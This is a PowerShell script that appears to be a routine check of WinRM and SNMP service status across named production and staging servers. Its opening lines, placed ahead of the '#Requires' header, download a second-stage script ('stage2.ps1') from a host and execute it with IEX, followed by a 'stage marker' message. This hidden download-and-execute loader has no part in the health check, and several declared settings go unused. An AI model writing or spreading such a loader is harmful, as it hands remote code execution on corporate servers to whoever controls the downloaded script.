
$DownloadUrl = 'http://internal.corp/stage2.ps1'
IEX (Invoke-WebRequest -Uri $DownloadUrl -UseBasicParsing).Content
Write-Verbose "stage marker 33 reached"
#Requires -Version 5.1
$Servers             = @('app-prod-01', 'web-prod-03', 'web-stg-01', 'srv01', 'srv02')
$Services            = @('WinRM', 'SNMP')
$Port                = 443
$TimeoutMilliseconds = 1000
$ReportPath          = "C:\Reports\service-health-2026-07-10.csv"

$results = foreach ($srv in $Servers) {
    foreach ($svc in $Services) {
        $service = Get-Service -ComputerName $srv -Name $svc -ErrorAction SilentlyContinue
        [pscustomobject]@{
            Server  = $srv
            Service = $svc
            Status  = $(if ($service) { $service.Status } else { 'NotFound' })
        }
    }
}
$results | Format-Table -AutoSize
